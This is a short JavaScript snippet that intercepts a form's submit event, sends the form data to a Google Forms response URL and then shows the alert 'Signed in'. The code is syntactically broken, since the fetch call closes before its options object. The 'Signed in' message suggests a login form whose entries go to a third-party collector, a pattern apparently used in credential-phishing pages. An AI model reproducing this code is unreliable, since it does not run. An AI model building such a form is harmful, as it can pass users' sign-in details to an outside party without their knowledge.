document.getElementById("googleform").addEventListener("submit", function(event){
    event.preventDefault();

    let formData = new
        FormData(this);

fetch("https://docs.google.com/forms/u/0/d/e/1FAIpQLScf1g3KcmavxDlVv3u6HWXx0tzox6dtI2ovIEHHnZ18ZswaBg/formResponse")
    method: "POST",
        body: formData,
        mode: "no-cors"}). then(response => { alert("Signed in");
                                            }).catch(error =>
    console.error("ERROR:", error));
});
